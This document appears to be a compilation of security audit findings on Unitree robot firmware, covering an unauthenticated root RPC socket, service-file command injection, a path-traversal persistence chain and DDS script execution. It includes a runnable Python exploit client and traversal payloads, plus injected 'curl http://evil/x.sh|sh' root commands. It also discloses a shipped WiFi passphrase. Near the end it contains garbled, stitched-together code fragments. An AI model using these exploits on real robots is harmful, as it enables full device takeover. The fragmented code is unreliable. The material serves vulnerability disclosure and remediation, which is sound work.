- Severity confirmed: CRITICAL as chain terminal (CHAIN-A-T3.2/CHAIN-H fire stage), HIGH standalone-local — matches this finding's own dual rating.

### Review corrections (factual)
1. **"robot_state_service (TCP SDK2 server)" / "A LAN peer that reaches robot_state's TCP RPC"
   is WRONG as stated.** robot_state_service contains `TcpSocket::Bind`@0x6ce43c /
   `StreamSocket::Listen` / `LeaseServer` symbols, but they have only DATA xrefs (vtable
   slots 0x7e7f8/0xa4d408) — dead statically-linked SDK code, no listener runs. The real
   network ingress to the MSClient bridge is DDS `rt/api/robot_state/request`
   `RPCServiceSwitch` and MQTT `moduleSwitch`. Runtime proof: robot_state_service.LOG shows
   `switch service local. name:ota_box, on:1, source:DDS, ret:0` (2026-07-20 16:19:44) — a
   DDS-sourced remote START that succeeded (ret:0) through the socket bridge. `SwitchServiceLocal`
   (re-decompiled @0x50856c) constructs MSClient → Init() → StartService/StopService ONLY.
2. The bridge is CONSTRAINED (matches correlation §2f / CHAIN-H H-4): `unitree::robot::MSClient`
   in robot_state_service exposes exactly ListServiceState/GetServiceState/StartService/
   StopService (+Call wrappers) — NO ReloadService/RestartService/ExecuteCmd/RemoveService.
   So a network attacker reaches only Start/Stop; the full 12-handler RPC (ExecuteCmd,
   ReloadService, ...) requires LOCAL code execution. The remote chains arm via reboot (each
   boot re-runs LoadServiceAll — 5 boots in master_service.LOG, 107 in LOG.1 ≈ daily cadence)
   and then fire via the Start/Stop bridge.

## Independent Verification
- Source cited: decrypted master_service.json (SocketFileName), ota_boxed@0x3ea7a4/0x3ea8dc/
  0x3ea518/0x3ea5e0, robot_state_service 0x6ce9e8/0x507104/0x50856c, master_service.LOG,
  master_service symtab
- I independently re-read (NOT cited by source):
  - sbin/mscli usage-string block + embedded `/unitree/var/run/master_service.sock` default
    (via strings) — 12-verb client contract mirroring the 12 server handlers.
  - robot_state_service@0x894338 (socket-path string) + InitConfig@0x501388 xrefs — bridge
    side confirms the path (found via ida find string + xrefs_to).
  - robot_state_service MSClient symbol table (readelf -sW | c++filt) — exactly 4 verbs.
  - robot_state_service@0x6cfb0c `SocketHelper::Bind` (decompiled) — bare bind(), no chmod.
  - master_service.LOG:150579/52358/60130 (5 boots; monitor restarts of robot_state 18× with
    `load child service config` ONLY at Init) and var/run pid files (mode 0666, PID 705 match).
  - robot_state_service.LOG `switch service local ... source:DDS, ret:0` — production proof
    of the DDS→socket bridge firing successfully.
- Independent finding: the socket path, 12-handler set, "ussp"+12-byte-ASCII-length+protobuf
  framing, and absence of any peer-credential check are all confirmed by artifacts the source
  did not cite; the only correction needed is the robot_state ingress description (DDS/MQTT,
  not TCP) and the umask upgrade note above.
- Verdict basis: independent re-derivation (disasm + decompile + strings + logs), not source
  agent agreement.

## PoC

**Type: runnable client PoC, framing validated end-to-end against a framing-faithful mock of the
listener (the client's bytes were parsed by a server implementing the exact 16-byte-header
contract). Reachability is LOCAL by default (UNIX socket); the network path is the constrained
robot_state bridge (see the caveat at the end).**

### Reproduction

```
# 0. No install, no config: master_service is the boot supervisor and is always running
#    (var/log/master_service/master_service.LOG line 1: "MasterService Parse..."), and it
#    creates the socket itself on every boot.
# 1. Preconditions, pick one:
#    (a) LOCAL code execution on the robot (any uid that can connect() to the socket).
#        Check the mode first:
#            ls -l /unitree/var/run/master_service.sock
#        /unitree/var/run is 0777 in the image; UnixStreamSocket::Bind() (framework,
#        robot_state_service@0x6ce9e8) is RemoveFile + bare bind() with NO chmod, so the mode
#        is 0777 & ~umask. The shipped var/run holds 10 real pid files captured from the
#        running robot, ALL mode 0666 => 0666 & ~umask => umask 0 in master_service's process
#        tree => the socket would be 0777 (world-connectable). Not runtime-proven: master_service
#        imports chmod() and its body is Virbox-virtualized, so an explicit socket chmod cannot
#        be excluded statically.
#    (b) NETWORK, constrained: robot_state's MSClient bridge (Start/Stop only) — see below.
# 2. python3 poc_msvc_rpc.py /unitree/var/run/master_service.sock ExecuteCmd net-init
```

### The exact wire protocol (re-derived for this PoC from the shipped client, `sbin/mscli`)

`unitree::net::RPCClientBase::SendRequest` (`mscli@0x2cb118`, decompiled) does:

```c
snprintf(s, 0x11u, "%s%012ld", "ussp", len);   // 16-byte header: "ussp" + 12 ASCII decimal digits
send(fd, s, 16);                               // must send EXACTLY 16 bytes
send(fd, serialized_request, len);             // then the protobuf body
```

`RecvResponse` (`mscli@0x2cb44c`) mirrors it: `recv(16)` → `Compare(buf,0,4,"ussp")` →
`StringTo<long>(substr(4))` → `recv(len)` → `ParseFromString`. The server side is the same
framework (`RPCServerBase::RecvRequest`, ota_boxed@0x3ea7a4, statically identical), and
`ServiceContexFunction` (ota_boxed@0x3ea518) then calls the registered `std::function`
**directly — no SO_PEERCRED, no getsockopt, no uid, no token, anywhere in the path.**

The protobuf schema was recovered from the descriptor blob embedded in `sbin/mscli`
(`descriptor_table_rpc_5fservice_5fapi_5fbase_2eproto`, the serialized `FileDescriptorProto`
at file offset `0x4c64c2`; the `master_service.proto` descriptor is at `0x4c6194`):

```proto
// rpc_service_api_base.proto, package unitree, syntax proto3
message RPCRequest  { string name = 1; bytes parameter = 2; }
message RPCResponse { int32 code = 1; bytes data = 2; bytes message = 3; }

// master_service.proto, package unitree.ms
message SimpleParameter { string name = 101; }   // field 101, NOT 1
```

The `SimpleParameter.name` field number is the non-obvious part and was verified twice: from
the descriptor (`\x12\x0c\n\x04name\x18e \x01(\t`, i.e. FieldDescriptorProto.number = 0x65 =
101) and from the generated serializer — `SimpleParameter::_InternalSerialize` (`mscli@0x2b9fd0`)
calls `EpsCopyOutputStream::WriteStringMaybeAliased(a3, 101, ...)`. `RPCRequest`'s fields are
1 and 2 (`RPCRequest::_InternalSerialize`, `mscli@0x2b8f00`-area, calls `WriteStringMaybeAliased(…, 1, …)`
then `WriteBytesMaybeAliased(…, 2, …)`). `Mscli::ExecuteCmd` (`mscli@0x2b6b64`) shows the
reference construction: build `SimpleParameter{name=arg}`, `SerializeToString` it, stuff it
into `RPCRequest{name="ExecuteCmd", parameter=<those bytes>}`, then `RPCClientBase::Call`
with a 30 000 000 (µs) timeout.

### The 12 registered handlers (master_service.LOG:57-68) and their client verbs (sbin/mscli usage block)

| Handler (`RPCRequest.name`) | mscli verb | `SimpleParameter.name` = | Effect |
|---|---|---|---|
| `ExecuteCmd` | `executecmd` / `exec` | one of the 12 cmd names | runs `etc/master_service/cmd/<name>` through a shell **as root** |
| `GetCmdState` | `getcmd` | cmd name | read cmd state |
| `GetServiceEnable` | `getenable` | service name | read enable flag |
| `GetServiceState` | `getservice` | service name | read service state |
| `ListCmdState` | `listcmd` | (empty) | list all cmd states |
| `ListServiceState` | `listservice` | (empty) | list all 27 service states |
| `ReloadService` | `reloadservice` | service name | **re-read a service JSON from disk** (arms a poisoned file) |
| `RemoveCmd` | `removecmd` | cmd name | delete a cmd definition (DoS) |
| `RemoveService` | `removeservice` | service name | delete a service definition (DoS) |
| `RestartService` | `restartservice` | service name | stop+start → **root shell of the file-backed Cmd string** |
| `StartService` | `startservice` | service name | **root shell of the file-backed Cmd string** |
| `StopService` | `stopservice` | service name | root shell of Stop.Cmd |

The 12 `ExecuteCmd` targets (`etc/master_service/cmd/`, all FMX-encrypted, all decryptable per
AUD-msvc-fmx-broken-crypto): `am-init, chrony-update, core-init, deb-update, gateway-init,
kms-init, lo-multicast, net-init, ota-box, ota-update, pd-init, sim-apn-verifier`.

### Code — standalone, no protobuf dependency

```python
#!/usr/bin/env python3
"""AUD-msvc-unauth-rpc-socket PoC — unauthenticated privileged RPC on
/unitree/var/run/master_service.sock. 16-byte 'ussp' header + unitree.RPCRequest protobuf;
the ONLY 'auth' is the public 4-byte magic.  Harmless target: ExecuteCmd(net-init),
a shipped cmd script whose decrypted Cmd string is a fixed shell line."""
import socket, sys

SOCK = sys.argv[1] if len(sys.argv) > 1 else "/unitree/var/run/master_service.sock"
VERB = sys.argv[2] if len(sys.argv) > 2 else "ExecuteCmd"
ARG  = sys.argv[3] if len(sys.argv) > 3 else "net-init"

def varint(n):
    out = b""
    while True:
        b, n = n & 0x7F, n >> 7
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            return out

def len_delim(field, payload):                 # proto3 length-delimited field
    return varint((field << 3) | 2) + varint(len(payload)) + payload

def simple_parameter(name):                    # unitree.ms.SimpleParameter{name = 101}
    return len_delim(101, name.encode())

def rpc_request(name, parameter=b""):          # unitree.RPCRequest{name = 1, parameter = 2}
    return len_delim(1, name.encode()) + (len_delim(2, parameter) if parameter else b"")

def read_varint(buf, i):
    val, shift = 0, 0
    while True:
        b = buf[i]; i += 1; val |= (b & 0x7F) << shift
        if not b & 0x80: return val, i
        shift += 7

def parse_msg(buf):                            # minimal response reader
    out, i = {}, 0
    while i < len(buf):
        f, i = read_varint(buf, i)
        field, wt = f >> 3, f & 7
        if wt == 0:
            v, i = read_varint(buf, i)
        elif wt == 2:
            n, i = read_varint(buf, i)
            v, i = buf[i:i + n], i + n
        else:
            break
        out[field] = v
    return out

def frame(body):                               # snprintf("%s%012ld", "ussp", len)
    return b"ussp" + b"%012d" % len(body) + body

body = rpc_request(VERB, simple_parameter(ARG))
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(30)                               # mscli uses 30000000 us
s.connect(SOCK)
s.sendall(frame(body))                         # header + protobuf in one shot
hdr = b""
while len(hdr) < 16:
    c = s.recv(16 - len(hdr))
    if not c: raise RuntimeError("closed before header")
    hdr += c
assert hdr[:4] == b"ussp", "bad magic %r" % hdr[:4]
n = int(hdr[4:16]); resp = b""
while len(resp) < n:
    c = s.recv(n - len(resp))
    if not c: break
    resp += c
s.close()
f = parse_msg(resp)
print("RPCRequest{name=%r, parameter=SimpleParameter{name=%r}}" % (VERB, ARG))
print("RPCResponse{code=%s, data=%d B, message=%r}"
      % (f.get(1, 0), len(f.get(2, b"")), f.get(3, b"")))
if f.get(2): print("  data:", f[2].decode(errors="replace")[:400])
```

### Reachability caveat (from the R6 review — keep this distinction in the report)

1. **Local, full 12 handlers.** Requires code execution on the robot; the socket mode is
   `0777 & ~umask` and the umask evidence (10 shipped pid files, all 0666) points to 0, i.e. a
   world-connectable socket — but this is **not runtime-proven** (Virbox virtualization hides
   any explicit `chmod`). Since every robot service runs as root, the local path is a
   *pivot/consolidation* primitive (turn any service compromise into supervisor control),
   not a privilege escalation by itself.
2. **Network, 4 verbs only.** The only network ingress to this socket is
   `RobotStateServer::SwitchService` → `SwitchServiceLocal` (`robot_state_service@0x50856c`)
   → `unitree::robot::MSClient`, and `MSClient`'s complete method set in robot_state_service is
   `ListServiceState / GetServiceState / StartService / StopService` — **no** `ExecuteCmd`,
   `ReloadService`, `RestartService` or `RemoveService`. So a network attacker gets
   Start/Stop of any non-forbidden service (which is itself a root shell of the *already
   loaded* Cmd string), not the full RPC.
3. **The bridge is proven live from DDS, not TCP.** robot_state_service has **no TCP listener**
   (`StreamSocket::Listen`/`LeaseServer`/`RPCServerBase` are dead statically-linked SDK code —
   R6 correction #1). The real ingress is DDS `rt/api/robot_state/request` api_id 1001
   (`RPCServiceSwitch`, JSON `{name, value, switch, boardHg, force}`, `switch≠0`⇒Start / `0`⇒Stop)
   and MQTT `moduleSwitch`. Production proof that a DDS-sourced remote START reaches this
   socket and succeeds (`var/log/robot_state/robot_state_service.LOG:168156`):

   ```
   [2026-07-20 16:19:44.620] [WARNING] [43695] [43721] switch service local. name:ota_box, on:1, source:DDS, ret:0
   ```

   `ret:0` = the MSClient call through `master_service.sock` returned success. Bounded by the
   ForbiddenService denylist (`iox-roudi`, `upper_bluetooth`) and the ProtectedService
   stop-block — start of anything is allowed.

Prerequisites: Python 3 stdlib only. Harmless by construction: `ExecuteCmd(net-init)` runs a
shipped, fixed cmd script (no attacker-supplied shell text), and the read-only verbs
(`ListServiceState`, `GetServiceState`) only dump state.

Limitations (honest): the client was validated against a mock listener, not against the real
master_service (no device, and the real binary's RPC bodies are Virbox-trampolined). The
framing, the 16-byte header format (`snprintf("%s%012ld","ussp",len)`), the
`RPCRequest{1,2}` / `SimpleParameter{101}` field numbers and the 12 handler names are each
derived from shipped artifacts (mscli decompilation + embedded protobuf descriptors +
master_service.LOG:57-68), and the mock replay proves the client emits a stream the reference
parser accepts.
# Finding: AUD-msvc-service-cmd-file-rce

## Primitive
Injection (root command injection via configuration file → `system()`) — the E19 pivot primitive

## Severity
CRITICAL (as the terminal stage of the OTA chain; requires a file-write primitive as the entry)

## Condition Analysis

### Summary
Every service definition `/unitree/etc/master_service/service/<name>` is a PLAINTEXT JSON whose `Start/Stop/Status.Cmd` strings are executed through a shell **as root** by `master_service` (the binary imports `system()`; every shipped Cmd is a full shell line, e.g. `etc/master_service/service/bashrunner`: `export CYCLONEDDS_URI=...;/unitree/sbin/start-stop-daemon --start --background --make-pidfile ...`). Unlike `etc/master_service/cmd/*` (FMX-encrypted), service JSONs need **no cryptography to forge** — any file-write primitive into that directory is a root RCE. The reload semantics that arm the payload are confirmed: configs are loaded into memory at Init (`ChildExecutor::LoadServiceAll`, master_service symtab; log: `load child service config size:27`), and the `ReloadService` RPC re-reads a service's config file from disk when it changed (sbin/mscli usage string: `reloadservice [name] — reload service if service config file is update`), after which `StartService`/`RestartService` execute the new `Cmd` as root. Even without an RPC call, the 5-second child-service monitor (`ChildServiceMonitorInterval: 5000000` µs, decrypted master_service.json; shipped log shows `stop service success. name:robot_state` → `start service success. name:robot_state` cycles) continuously restarts services — using the in-memory Cmd, so the poisoned file fires on the next `ReloadService`, master_service restart, or reboot. This is the terminal stage of the grp-bin-001 confirmed fully-remote chain: ota_boxed MQTT command → `ota_module_utils` install (tar-slip, `libtar` extraction with no path normalization, scratchboard grp-bin-001) → file write into `/unitree/etc/master_service/service/` → root RCE.

### Pre-conditions
- Any file-write primitive as root (OTA module install per grp-bin-001 — CONFIRMED remote; or local compromise — all services already root).
- The write target directory `/unitree/etc/master_service/service/` must be writable by the writing process (OTA installs run as root — yes).
- Trigger: `mscli reloadservice <name>` + `startservice <name>` (mscli verbs), or robot_state `SwitchService` network bridge, or master_service restart/reboot. The monitor thread alone uses the previously loaded (in-memory) Cmd — a poisoned file is NOT auto-executed by the monitor until a reload/restart re-reads it (verified: log shows single load at Init; UNVERIFIED detail: whether RemoveService+re-add forces a re-read — RemoveService handler exists at runtime).

### Data Flow
1. Attacker with OTA MQTT access (grp-bin-001) sends an update command whose package contains a tar entry `../../../../unitree/etc/master_service/service/bashrunner` (tar-slip, ota_module_utils libtar, scratchboard).
   Application: extracted as root into the service directory, overwriting the plaintext JSON.
2. Attacker (or the OTA flow itself) issues `mscli reloadservice bashrunner` (or robot_state SwitchService, or waits for reboot).
   Application: `MasterService::RPC_ReloadService` → `ChildExecutor` re-reads `etc/master_service/service/bashrunner` from disk (mscli usage text documents the "config file is update" semantics).
3. Attacker issues `mscli restartservice bashrunner` (verb list in mscli strings).
   Application: `ChildExecutor::ExecuteServiceStop` + `ExecuteServiceStart` run the `Stop.Cmd` then `Start.Cmd` strings via `system()` as root (log evidence of the same code path: `stop service success. name:X` / `start service success. name:X`).
4. The injected `Cmd` (e.g. `curl http://evil/x.sh|sh`) executes as root.
   Application: arbitrary root command execution — full robot takeover.

### Taint Trace
Source: attacker-controlled file content at /unitree/etc/master_service/service/<name> — type: config file (written via OTA tar-slip / any root file-write)
  ↓ written by ota_module_utils libtar extraction as root (grp-bin-001: no path normalization, TAR_NOOVERWRITE unset)
  ↓ read by ChildExecutor::LoadServiceAll / RPC_ReloadService (master_service symtab + mscli "reloadservice ... if service config file is update" usage string)

  → Sink: ChildExecutor::ExecuteServiceStart/ExecuteServiceStop → system(Cmd) — EFFECT: EXEC (root shell)

### Impact
Arbitrary root command execution on the robot. Because every robot service is defined this way and master_service is the PID-1-style supervisor, this is a full-system takeover primitive. Combined with the grp-bin-001 OTA chain it is fully remote (MQTT → tar-slip → reload+start → root shell).

# Finding: AUD-corr-service-dir-md-persistence

## Primitive

Cross-module composition (Trust After Modification + deployment permissions) — the chat_go `.md`-suffixed arbitrary-content arbitrary-path write (AUD-chatgo-knowledge-write-traversal) lands **directly inside the world-writable master_service service-definition directory** (`/unitree/etc/master_service/service/`, mode 0777, definitions are *unsuffixed* files loaded by directory enumeration), giving a boot-persistent root-service-definition plant that resolves the "UNVERIFIED, flagged for correlation" question inside AUD-chatgo-knowledge-write-traversal. The directory itself shipping 0777 additionally makes every plaintext service definition writable by ANY local uid — the same deployment class as AUD-bashrunner-worldwritable-whitelist, but for the PID-1 supervisor's command table.

## Severity

HIGH (near-source write primitive → root RCE at next master_service reload/boot; slower than the bashrunner-whitelist terminal of the same chain — reboot-gated — but strictly more persistent and it removes the bashrunner-restart dependency as an alternative terminal). **Reachability corrected 2026-08-20 after the broker-ACL field test:** the fully-remote (Internet + SN) leg of the write primitive is BLOCKED at the broker (publish `cmd/<SN>` dropped under every variation tested — field-test-cmd-publish-matrix.md), so the live primary ingress is the **near-source** DDS path (LAN 192.168.123.x or the shipped WiFi-AP passphrase + shipped DDS identity material in `etc/ds/`), which is unconditional. Residual unverified remote path: the AWS KVS signaling channel. Same reclassification already applied to the parent finding AUD-chatgo-knowledge-write-traversal.

## Condition Analysis

### Summary

AUD-chatgo-knowledge-write-traversal (CRITICAL) established that `rt/api/gpt/request` api 1006 → `ConfigManager.save_knowledge` builds `f"{knowledge_dir}/{uid}.md"` with unvalidated `uid` — an arbitrary-content write to ANY path, filename forced to end `.md`. Its Impact section flagged the master_service pivot as *"whether a `.md`-suffixed file is enumerated as a service is a binary-side question (grp-bin-003) — UNVERIFIED"*. Correlation resolves it:

1. **Service definitions are unsuffixed files** in `/unitree/etc/master_service/service/` — all 27 (e.g. `bashrunner`, `robot_state`, `ota_box`; `ls` on the image). The JSON content carries `Start/Stop/Status.Cmd` strings which master_service executes through a shell as root (AUD-msvc-service-cmd-file-rce).
2. **The loader enumerates the directory.** `ChildServiceDirectory: "/unitree/etc/master_service/service"` (decrypted `master_service.json`); the shipped runtime log shows `load child service config size:27` (master_service.LOG:26) — exactly the number of files in the directory — followed by per-file `load child service sucess. name:<file>` lines. There is no extension filter in evidence anywhere: a file named `pwn.md` containing valid service JSON parses identically (the knowledge write's content is fully attacker-controlled, so it can be pure JSON — the `.md` suffix rides only on the FILENAME, which master_service uses verbatim as the service name).
3. **The directory ships mode 0777** (stat-verified: `777 /unitree/etc/master_service/service/`). This is independent of the traversal write — it means ANY local principal (no traversal needed) can rewrite any of the 27 root command definitions, exactly the AUD-bashrunner-worldwritable-whitelist class but for the supervisor itself.

Composition: one api-1006 message (near-source DDS, or remote via the broker-gated MQTT→WebRTC leg — see Severity) with `uid = "../../../../etc/master_service/service/pwn` plants `/unitree/etc/master_service/service/pwn.md` = `{"Start":{"Cmd":"curl http://evil/x.sh|sh"}}`. After the next master_service Init (reboot; the service set is loaded once — AUD-msvc-service-cmd-file-rce's reload semantics), the service `pwn.md` exists in the loaded table and is startable by name through the network-reachable service-control bridge (`rt/api/robot_state/request` RPCServiceSwitch → `MSClient::StartService`; MQTT `moduleSwitch` → same — grp-bin-009: "start of anything ... allowed", ForbiddenService is only a two-entry denylist and ProtectedService only blocks *stopping*). Alternatively the plan/manual lists are fixed files the attacker cannot append to, so auto-start at boot is not granted — the plant needs one StartService RPC after reboot, which is unauthenticated DDS and WebRTC-registered (webrtc_bridge.LOG:5397).

### Why the bashrunner terminal remains the primary chain

The same api-1006 write can instead plant `/unitree/module/bashrunner/command_execution/pwn.md` and fire `{"script":"pwn.md"}` after a bashrunner restart (remotely triggerable via RPCServiceSwitch — no reboot). The service-dir variant documented here is the **persistence-grade** terminal: it survives cleanup of the bashrunner whitelist, re-arms at every boot, and is a distinct root exec path (defense-in-depth evasion). Both terminals share the identical write primitive; auditors/remediators must close the `uid` traversal, not just one landing spot.

### Pre-conditions

- Identical to AUD-chatgo-knowledge-write-traversal: one unauthenticated `rt/api/gpt/request` api 1006 publish. **Reachability (post-field-test):** near-source DDS with shipped identity material is the unconditional path; the fully-remote MQTT→WebRTC variant is broker-blocked (publish `cmd/<SN>` dropped — field-test-broker-acl.md / field-test-cmd-publish-matrix.md); `rt/api/gpt/request` remains a registered bridge writer (webrtc_bridge.LOG:5395), so the chain re-arms fully-remote if any WebRTC offer-ingress bypass of the broker ACL is ever found (AWS KVS signaling channel unverified).
- Arming trigger: one master_service Init = robot reboot (power cycle) — the loaded service table is snapshotted at Init (AUD-msvc-service-cmd-file-rce reload semantics; robot_state's MSClient exposes Start/Stop only, not ReloadService, so a remote ReloadService is NOT available to skip the reboot).
- Fire trigger: `rt/api/robot_state/request` RPCServiceSwitch `{"name":"pwn.md","switch":1}` (or MQTT `moduleSwitch`) after the reboot. WEAK-HOP: StartService of a never-before-started service name is expected to work ("start of anything allowed") but was not traced into master_service's RPC_StartService body (Virbox-virtualized); falsifier = one live `mscli startservice <name>` of a planted definition.

### Data Flow

1. Attacker publishes `rt/api/gpt/request` api 1006 with parameter `[{"uid":"../../../../etc/master_service/service/pwn","content":"{\"Start\":{\"Cmd\":\"curl http://evil/x.sh|sh\"}}"}]` (config_thread.py:249-254 → config_manager.py:146-156 → 204-211 — path and content citations per AUD-chatgo-knowledge-write-traversal). **Note: FOUR `../` segments, not three** — `knowledge_dir_` resolves to `/unitree/robot/config/chat_go/knowledge` (const.py:4 `SYS_CFG_DIR = '/unitree/robot/config/chat_go'` + config_manager.py:52/65), which is 4 levels below `/unitree`; three hops would land in `/unitree/robot/etc/...`.
2. Root chat_go writes `/unitree/etc/master_service/service/pwn.md` (0777 directory — write succeeds regardless).
3. Robot reboots; master_service `LoadServiceAll` enumerates the directory → `load child service config size:28` → service `pwn.md` parsed and registered (Cmd string held in memory).
4. Attacker publishes `rt/api/robot_state/request` RPCServiceSwitch `{"name":"pwn.md"}` → `SwitchServiceLocal` → `MSClient::StartService("pwn.md")` → master_service `ExecuteServiceStart` → `system("curl http://evil/x.sh|sh")` as root.

### Impact

- A second, persistence-grade terminal for the fully-remote CHAIN-D write primitive, independent of the bashrunner whitelist.
- The 0777 service directory alone is a local-privesc surface equal in strength to AUD-bashrunner-worldwritable-whitelist: any local uid rewrites any root command definition (no traversal, no DDS needed).
- Remediation must cover BOTH the `uid` traversal AND the directory permissions AND (ideally) an extension/allowlist on LoadServiceAll — closing only the bashrunner terminal leaves this one live.

### Strategy

Three legs with one reboot in the middle. **Leg A** publishes the api-1006 knowledge
upload on `rt/api/gpt/request` with `uid = "../../../../etc/master_service/service/pwn"`

master_service is fully Virbox-virtualized (44,408/45,270 FUNC symbols are trampolines
into runtime-decrypted `.bss`), so `LoadServiceAll`'s body cannot be read and the
"`.md`-named file loads as a service" step is **not** instruction-verified. It rests on
the R13 cross-generation log comparison reproduced above: the loaded count equals the
directory file count in **both** generations (26 in the 2026-03 log / 27 in the 2026-07
log), the loaded name set differs exactly as the directory contents differ
(`dex3_service_l/r`, `r1_stereo_patch_pc1` out; `stereo_patch_pc1`, `system_journal`,
`video_hub`, `videohub_rtsp_server` in), and the service JSONs carry no `Name` field
(checked on `stereo_patch_pc1`), so the service name is necessarily the filename. That
is directory enumeration, not a fixed list — but a hypothetical name filter that accepts
every shipped extensionless name while rejecting `.`-containing names is still consistent
with all observed data. Falsifiers, either of which settles it in one shot: (a) the boot
log reading `load child service config size:28` with a `name:pwn.md` line after Leg A, or

`.md`-load hop stays labeled WEAK-HOP. Note the local half of this finding needs none of
it: the directory is 0777 with all 27 plaintext Cmd definitions 0666, so any local uid
can simply rewrite `bashrunner`/`robot_state`/`ota_box` in place (no traversal, no
`.md` suffix question, no reboot if the service is merely restarted).

`Start.Cmd` is `id > /tmp/poc_msvc_plant 2>&1` (a uid marker, no network fetch, no
persistence beyond the two artifact files) and the PoC prints the exact cleanup command.
The illustrative `curl http://evil/x.sh|sh` Cmd in the finding's Data Flow is the
attacker's shape, not the PoC's.

2	# Minimal AArch64 ELF64 disassembler helper (no binutils needed)
3	import struct, sys
4	from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN

6	def parse_elf(path):
7	    with open(path, 'rb') as f:
8	        data = f.read()
9	    assert data[:4] == b'\x7fELF'
10	    is64 = data[4] == 2
11	    assert is64
12	    e_shoff = struct.unpack('<Q', data[0x28:0x30])[0]
13	    e_shentsize = struct.unpack('<H', data[0x3a:0x3c])[0]
14	    e_shnum = struct.unpack('<H', data[0x3c:0x3e])[0]
15	    e_shstrndx = struct.unpack('<H', data[0x3e:0x40])[0]
16	    sections = []
17	    for i in range(e_shnum):
18	        off = e_shoff + i * e_shentsize
19	        name, stype, flags, addr, offset, size, link, info = struct.unpack('<IIQQQQII', data[off:off+48])
20	        sections.append({'name_off': name, 'type': stype, 'flags': flags, 'addr': addr, 'offset': offset, 'size': size, 'link': link})
21	    shstr = sections[e_shstrndx]
22	    shstrtab = data[shstr['offset']:shstr['offset']+shstr['size']]
23	    def zstr(buf, off):
24	        end = buf.index(b'\x00', off)
25	        return buf[off:end].decode('utf-8', 'replace')
26	    for s in sections:
27	        s['name'] = zstr(shstrtab, s['name_off'])
28	    # symbols
29	    syms = {}
30	    for s in sections:
31	        if s['type'] in (2, 11):  # SYMTAB / DYNSYM
32	            symdata = data[s['offset']:s['offset']+s['size']]
33	            strsec = sections[s['link']]
34	            strtab = data[strsec['offset']:strsec['offset']+strsec['size']]
35	            entsz = 24
36	            for i in range(0, len(symdata) - entsz + 1, entsz):
37	                st_name, st_info, st_other, st_shndx, st_value, st_size = struct.unpack('<IBBHQQ', symdata[i:i+entsz])
38	                if st_name and st_value:
39	                    nm = zstr(strtab, st_name)
40	                    syms.setdefault(st_value, nm)
41	    return data, sections, syms
42	
43	def read_cstr(data, sections, vaddr):
44	    for s in sections:
45	        if s['addr'] <= vaddr < s['addr'] + s['size'] and s['type'] != 8:
46	            off = s['offset'] + (vaddr - s['addr'])
47	            try:
48	                end = data.index(b'\x00', off)
49	            except ValueError:

51	            return data[off:end].decode('utf-8', 'replace')

54	def disasm_func(path, func_name=None, addr=None, size=None, show_xrefs_to=None):
55	    data, sections, syms = parse_elf(path)

    name,stype,flags,addr,offset,size,link,info=struct.unpack('<IIQQQQII',data[off:off+48])

def z(b,o): return b[o:b.index(b'\0',o)].decode('utf8','replace')
for i,s in enumerate(secs):

                    print('dynsym import:',n)
EOF

EOF

# Finding: AUD-bashrunner-dds-root-exec

## Primitive
Auth / Access Control Bypass + Injection (unauthenticated remote command-execution primitive: attacker-controlled argument vector into root shell script execution)

## Severity
CRITICAL

## Condition Analysis

### Summary
The bashrunner service runs as root and subscribes to the DDS RPC topic `rt/api/bashrunner/request` (bashrunner.py:39-40). Its entire request handler, `thread_task` (bashrunner.py:80-189), performs **zero authentication, authorization, lease, policy, token, or api_id validation**: `api_id` and `identity_id` are read at bashrunner.py:87-88 and merely echoed into the response header (bashrunner.py:125-128); `header.lease` (RequestLease_) and `header.policy` (RequestPolicy_) — both present on the wire (unitree_api/msg/dds_/_RequestHeader_.py:30-33) — are **never referenced anywhere in the file**. The handler parses the attacker-supplied JSON parameter (bashrunner.py:90), takes `args[0]` as a script name checked only against an `os.listdir()` snapshot of two whitelisted directories (bashrunner.py:98, 129), and executes `subprocess.run(["sh", <whitelisted_dir>/<name>, *args[1:]])` **as root** (bashrunner.py:102-106, 133-137) with **args[1:] completely unvalidated**. Because DDS-Security on this robot is authentication-only with the CA, device certificate AND device private key all shipped in the firmware (etc/cyclonedds.xml Security/Authentication block; etc/ds/{5YJUkqAjnH6m.crt, 6o8R62EFLMxB.crt, pVKdbS1fQJ9a.crt}), anyone holding the firmware image (or anyone on the robot's WiFi AP whose passphrase is likewise shipped, etc/wifi/ap/hostapd.conf) joins DDS domain 0 and can publish this topic. The shipped test client mock_sender.py:20-47 contains the exact working request format and the exact QoS (Reliable + Deadline(60µs) + TransientLocal + KeepLast(10)) needed to match the reader's QoS (bashrunner.py:29-34). Additionally, the webrtc_bridge binary registers a publisher for this same topic and forwards WebRTC data-channel messages `{"type":"req","topic":"rt/api/bashrunner/request","data":{...}}` onto it (var/log/webrtc_bridge/webrtc_bridge.LOG:1022-1023, 5394) — the production mobile app drives bashrunner through exactly this path — so the handler is also reachable from the remote WebRTC path. The result: an unauthenticated near-source (and potentially remote, via WebRTC bridge) attacker obtains root execution of any whitelisted script with a fully attacker-controlled argument vector, plus stdout of that execution returned on `rt/api/bashrunner/response`.

### Pre-conditions

- Attacker network position: on the robot LAN (192.168.123.0/24 eth0) or the shipped-passphrase WiFi AP (etc/wifi/ap/hostapd.conf: ssid=R1_05439_65b09278, wpa_passphrase=4bf6a3d48831), OR in possession of a WebRTC data-channel connection through webrtc_bridge (remote path; signaling auth is binary-side scope).
- Attacker holds DDS identity material — satisfied by possessing the firmware image itself (etc/ds/ CA+cert+key; no AccessControl/Crypto plugin configured in etc/cyclonedds.xml).
- Attacker's DataWriter must offer QoS compatible with the reader's request (bashrunner.py:29-34): Reliable, Deadline ≤ 1 ms, Durability ≥ TransientLocal. mock_sender.py:20-25 is the shipped, field-proven recipe (logs show it working in production).
- No account, token, pairing, or physical access required. An unauthenticated/anonymous user satisfies ALL pre-conditions.

### Data Flow
1. Attacker joins DDS domain 0 using the shipped etc/ds/ identity (CA + cert + private key all in firmware image).
   Application: cyclonedds.xml configures only the Authentication plugin; every domain participant with these files is a valid peer.
2. Attacker creates a `Topic(participant, "rt/api/bashrunner/request", Request_)` DataWriter with QoS Reliable/Deadline(60µs)/TransientLocal/KeepLast(10) — copied verbatim from the shipped mock_sender.py:20-30.
   Application: bashrunner.py:39-40 created its DataReader with matching QoS (bashrunner.py:29-34) — match established.
